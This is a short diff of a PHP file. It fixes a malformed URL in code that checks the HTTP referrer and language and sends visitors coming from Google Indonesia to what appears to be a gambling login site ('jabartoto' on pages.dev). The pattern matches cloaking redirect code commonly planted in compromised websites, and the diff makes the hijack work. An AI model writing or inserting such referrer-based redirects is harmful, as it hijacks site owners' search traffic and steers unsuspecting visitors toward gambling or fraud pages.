@@ -20,7 +20,7 @@ exit;
 
 if (stripos($s_ref, 'google.co.id') !== false ||
 (stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://linklogin-jabartoto.pages.dev /");
+header("Location: https://linklogin-jabartoto.pages.dev/");
 exit;
 }
 ?>
